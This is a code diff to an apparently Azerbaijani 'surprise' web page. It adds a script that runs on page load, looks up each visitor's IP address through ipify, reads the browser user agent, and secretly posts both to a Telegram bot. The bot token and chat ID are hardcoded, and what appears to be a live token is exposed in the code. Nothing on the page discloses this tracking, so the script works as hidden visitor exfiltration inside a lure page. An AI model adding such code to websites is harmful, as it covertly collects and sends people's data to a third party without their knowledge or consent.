@@ -39,6 +39,28 @@ Sürprizi aç ✨
 </div>
 
 </main>
+<script>
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const userIP = data.ip;
+      const userAgent = navigator.userAgent;
+      const botToken = '8898539577:AAEio79TVe2UPlYevcUD9yks9ju9VfUYE2A';
+      const chatId = '1937526981';
 
+      const text = `🚨 *Yeni Ziyarətçi!*\n\n🌐 *IP:* ${userIP}\n📱 *Cihaz/Brauzer:* ${userAgent}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      });
+    });
+</script>
+  
 </body>
 </html>
